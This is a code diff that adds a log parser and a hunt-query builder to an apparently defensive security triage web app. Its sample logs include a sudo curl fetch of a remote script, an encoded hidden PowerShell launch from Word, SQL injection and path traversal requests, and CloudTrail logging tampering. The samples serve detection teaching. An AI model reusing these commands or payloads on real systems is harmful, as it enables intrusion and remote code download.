@@ -6,10 +6,13 @@ import { detail, status, productName } from "../cvecard.js";
 import { bump } from "../state.js";
 import { hashes, fileType, entropy, strings, MARKERS, RISKY_EXT } from "../filetriage.js";
 import { EVENT_IDS, PORT_INFO } from "../content/reference.js";
+import { parseLogs, findings, topValues, toCsv, huntQueries, COLS } from "../logparse.js";
 
 // [id, name, icon, colour, one-line description, group]
 const TOOLS = [
   ["lookup", "Lookup", "target", "#5CE1C6", "One indicator in, every useful pivot out.", "Investigate"],
+  ["logs", "Log parser", "table", "#FFB547", "Paste raw logs. Get the useful fields, a summary and what stands out.", "Investigate"],
+  ["hunt", "Hunt query builder", "code", "#5CE1C6", "Turn indicators into ready-to-run KQL, SPL, Elastic and SecOps searches.", "Investigate"],
   ["file", "File and hash check", "file", "#FFB547", "Hash a file, verify a download, and see what it really is.", "Investigate"],
   ["ioc", "IOC extractor", "list", "#5CE1C6", "Pull indicators out of messy text, defanged and ready for a ticket.", "Investigate"],
   ["headers", "Email headers", "mail", "#7FB2FF", "SPF, DKIM, DMARC and the classic sender tricks.", "Investigate"],
@@ -113,6 +116,10 @@ function tool(t) {
     put(box, h("p.muted.small", "Nothing is sent until you click a link. Each opens in a new tab with no referrer."), inp, o);
   } else if (t === "file") {
     fileTool(box);
+  } else if (t === "logs") {
+    logTool(box);
+  } else if (t === "hunt") {
+    huntTool(box);
   } else if (t === "unwrap") {
     inp.placeholder = "Paste a SafeLinks, Proofpoint URL Defense, Google or other redirect link";
     inp.value = "https://nam12.safelinks.protection.outlook.com/?url=https%3A%2F%2Furldefense.com%2Fv3%2F__https%3A%2F%2Fexample.com%2Finvoice%3Fid%3D42__%3B!!AbC%24&data=05%7C02&reserved=0";
@@ -380,4 +387,85 @@ function portTool(box) {
   q.addEventListener("input", draw); draw();
   load("threatmap").then((tm) => { live = tm?.ports || []; draw(); });
   put(box, q, list, h("p.muted.small", "Live ranking from SANS Internet Storm Center sensors. Any service can run on any port, so confirm with the traffic itself."));
+}
+
+// ---------- Log parser ----------
+const SAMPLES = {
+  "Linux auth.log": `Nov 28 10:01:01 web01 sshd[2211]: Failed password for invalid user admin from 203.0.113.9 port 51234 ssh2
+Nov 28 10:01:03 web01 sshd[2211]: Failed password for root from 203.0.113.9 port 51236 ssh2
+Nov 28 10:01:05 web01 sshd[2211]: Failed password for oracle from 203.0.113.9 port 51238 ssh2
+Nov 28 10:01:07 web01 sshd[2211]: Failed password for deploy from 203.0.113.9 port 51240 ssh2
+Nov 28 10:01:09 web01 sshd[2211]: Failed password for ubuntu from 203.0.113.9 port 51242 ssh2
+Nov 28 10:01:12 web01 sshd[2211]: Accepted password for ubuntu from 203.0.113.9 port 51250 ssh2
+Nov 28 10:02:00 web01 sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.4/x.sh`,
+  "Windows events (XML)": `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>4625</EventID><TimeCreated SystemTime="2026-11-28T09:59:01.123Z"/><Channel>Security</Channel><Computer>DC01.corp.example</Computer></System><EventData><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">CORP</Data><Data Name="LogonType">3</Data><Data Name="Status">0xc000006d</Data><Data Name="SubStatus">0xc000006a</Data><Data Name="WorkstationName">WS-042</Data><Data Name="IpAddress">10.20.3.7</Data><Data Name="IpPort">50123</Data></EventData></Event>
+<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID><TimeCreated SystemTime="2026-11-28T10:03:11.000Z"/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WS-042.corp.example</Computer></System><EventData><Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data><Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA</Data><Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data><Data Name="User">CORP\\amy</Data><Data Name="Hashes">SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C</Data></EventData></Event>`,
+  "Web access log": `198.51.100.7 - - [28/Nov/2026:10:00:01 +0000] "GET /index.php?id=1%27%20UNION%20SELECT%201,2-- HTTP/1.1" 500 512 "-" "sqlmap/1.8#stable"
+198.51.100.7 - - [28/Nov/2026:10:00:02 +0000] "GET /../../etc/passwd HTTP/1.1" 404 0 "-" "sqlmap/1.8#stable"
+203.0.113.20 - - [28/Nov/2026:10:00:05 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Go-http-client/1.1"
+192.0.2.44 - amy [28/Nov/2026:10:00:09 +0000] "POST /login HTTP/1.1" 200 2311 "https://shop.example/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"`,
+  "AWS CloudTrail (JSON)": `{"Records":[{"eventTime":"2026-11-28T10:00:00Z","eventSource":"cloudtrail.amazonaws.com","eventName":"StopLogging","awsRegion":"us-east-1","sourceIPAddress":"203.0.113.50","userAgent":"aws-cli/2.15","userIdentity":{"type":"IAMUser","userName":"dev-bob"}},{"eventTime":"2026-11-28T10:01:30Z","eventSource":"iam.amazonaws.com","eventName":"CreateAccessKey","sourceIPAddress":"203.0.113.50","userAgent":"aws-cli/2.15","userIdentity":{"type":"IAMUser","userName":"dev-bob"},"requestParameters":{"userName":"admin-ci"}}]}`,
+  "Firewall (key=value)": `date=2026-11-28 time=10:00:00 devname="FGT-01" devid="FG100F" logid="0000000013" type="traffic" subtype="forward" srcip=10.1.8.12 srcport=49822 dstip=198.51.100.77 dstport=4444 action="accept" app="tcp/4444"
+date=2026-11-28 time=10:00:02 devname="FGT-01" devid="FG100F" logid="0000000013" type="traffic" subtype="forward" srcip=203.0.113.9 srcport=40000 dstip=10.1.0.5 dstport=3389 action="deny"`,
+};
+let huntSeed = "";
+function logTool(box) {
+  const inp = h("textarea.tall", { spellcheck: "false", "aria-label": "Raw logs", placeholder: "Paste raw logs: Windows event XML, Sysmon, JSON (CloudTrail, Entra, Okta, ECS), syslog or auth.log, Apache/Nginx, CEF/LEEF, key=value or CSV with a header." });
+  const res = h("div.lp-res", { "aria-live": "polite" });
+  const samples = h("div.seg.wraptabs.small", Object.keys(SAMPLES).map((k) => h("button", { type: "button", onclick: () => { inp.value = SAMPLES[k]; go(); } }, k)));
+  let last = null, timer = 0;
+  const go = () => { clearTimeout(timer); timer = setTimeout(render, 220); };
+  const download = (name, body, type) => { const a = h("a", { download: name }); a.setAttribute("href", URL.createObjectURL(new Blob([body], { type }))); document.body.append(a); a.click(); setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 500); };
+  function render() {
+    const { fmt, rows } = parseLogs(inp.value); last = rows;
+    if (!rows.length) { put(res, h("p.muted.small", "Paste some log lines, or try a sample above.")); return; }
+    const cols = COLS.filter(([k]) => rows.some((r) => r[k]));
+    const times = rows.map((r) => r.time).filter(Boolean);
+    const flags = findings(rows);
+    const tops = [["src_ip", "Source IPs"], ["user", "Users"], ["event", "Events"], ["action", "Outcomes"], ["dst_port", "Dest ports"], ["host", "Hosts"], ["status", "HTTP status"]]
+      .map(([k, l]) => [l, topValues(rows, k)]).filter(([, v]) => v.length);
+    const iocs = extract(rows.map((r) => [r.src_ip, r.dst_ip, r.url, r.cmd, r.hash, r.msg].filter(Boolean).join(" ")).join("\n"));
+    const nIoc = Object.values(iocs).reduce((n, a) => n + a.length, 0);
+    const table = h("div.lp-tablew", h("table.lp-table", h("thead", h("tr", cols.map(([, l]) => h("th", l)))),
+      h("tbody", rows.slice(0, 200).flatMap((r, i) => {
+        const tr = h("tr", { tabindex: "0", title: "Show every field" }, cols.map(([k]) => h("td.c-" + k, r[k] || "")));
+        const det = h("tr.lp-det", { hidden: true }, h("td", { colspan: String(cols.length) }, h("dl", Object.entries(r._f || {}).slice(0, 80).flatMap(([k, v]) => [h("dt", k), h("dd", v)]))));
+        const flip = () => { det.hidden = !det.hidden; tr.classList.toggle("open", !det.hidden); };
+        tr.addEventListener("click", flip); tr.addEventListener("keydown", (e) => { if (e.key === "Enter") flip(); });
+        return [tr, det];
+      }))));
+    put(res,
+      h("div.lp-head", h("span.lk-badge", fmt), h("b", `${fmtNum(rows.length)} record${rows.length === 1 ? "" : "s"}`), times.length ? h("span.muted.small", `${times[0]} → ${times[times.length - 1]}`) : null,
+        h("span.muted.small", `${cols.length} fields found`)),
+      flags.length ? h("ul.fx-flags", flags.map((f) => h("li", f))) : h("p.note.ok", "Nothing obviously malicious in these lines. Read the table anyway: context beats rules."),
+      tops.length ? h("div.lp-tops", tops.map(([l, v]) => { const max = v[0][1]; return h("div.lp-top", h("h4", l), h("ol", v.map(([k, n]) => { const f = h("i"); f.style.width = Math.max(6, (n / max) * 100) + "%"; return h("li", h("span", { title: k }, k), h("span.mbar", f), h("b", String(n))); }))); })) : null,
+      h("div.row.lp-actions",
+        h("button.btn.sm", { type: "button", onclick: () => copyText(toCsv(rows, cols), "Copied as CSV") }, "Copy as CSV"),
+        h("button.btn.sm.ghost", { type: "button", onclick: () => download("parsed-logs.csv", toCsv(rows, cols), "text/csv") }, "Download CSV"),
+        h("button.btn.sm.ghost", { type: "button", onclick: () => download("parsed-logs.json", JSON.stringify(rows.map(({ _f, ...x }) => x), null, 1), "application/json") }, "Download JSON"),
+        nIoc ? h("button.btn.sm.ghost", { type: "button", onclick: () => { huntSeed = iocText(iocs).replace(/ \(\d+\)/g, ""); openTool("hunt"); } }, `Hunt these ${nIoc} indicators`) : null),
+      rows.length > 200 ? h("p.muted.small", `Showing the first 200 of ${fmtNum(rows.length)} rows. Exports include all of them.`) : null,
+      table, h("p.muted.small", "Click a row to see every original field."));
+  }
+  inp.addEventListener("input", go);
+  inp.value = SAMPLES["Linux auth.log"]; render();
+  put(box, h("p.muted.small", "Pasted logs stay in this tab. Up to 5,000 lines. Field names are matched to a common set, so every source reads the same way."), samples, inp, res);
+}
+
+// ---------- Hunt query builder ----------
+function huntTool(box) {
+  const inp = h("textarea.short", { spellcheck: "false", "aria-label": "Indicators", placeholder: "Paste IPs, domains, URLs, hashes and email addresses. Defanged or in messy text is fine." });
+  inp.value = huntSeed || "185.220.101[.]4\nlogin-micros0ft[.]com\nde96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c\ninvoices@paypa1-support.top"; huntSeed = "";
+  const days = h("select", { "aria-label": "Time range" }, [1, 7, 30, 90].map((d) => h("option", { value: d, selected: d === 7 }, `Last ${d} day${d > 1 ? "s" : ""}`)));
+  const res = h("div.hq-res");
+  const go = () => {
+    const x = extract(inp.value); const n = Object.values(x).reduce((s, a) => s + a.length, 0);
+    if (!n) { put(res, h("p.muted.small", "No indicators found yet.")); return; }
+    const counts = [["IPs", x.ips], ["domains", x.domains], ["URLs", x.urls], ["SHA-256", x.sha256], ["SHA-1", x.sha1], ["MD5", x.md5], ["emails", x.emails]].filter(([, a]) => a.length).map(([l, a]) => `${a.length} ${l}`).join(", ");
+    put(res, h("p.small", h("b", "Found: "), counts, h("span.muted", ". Private IPs are kept: they matter for internal hunting.")),
+      huntQueries(x, +days.value).map(([name, q]) => h("div.hq", h("div.hq-h", h("b", name), h("button.btn.sm", { type: "button", onclick: () => copyText(q, `${name.split(" (")[0]} query copied`) }, "Copy")), h("pre.codebox", q))),
+      h("p.muted.small", "Table and field names follow each product's defaults (Defender advanced hunting, Splunk CIM, Elastic ECS, SecOps UDM). Adjust them to your own data before relying on a clean result."));
+  };
+  inp.addEventListener("input", go); days.addEventListener("change", go); go();
+  put(box, inp, h("label.ua-cc", "Time range ", days), res);
 }
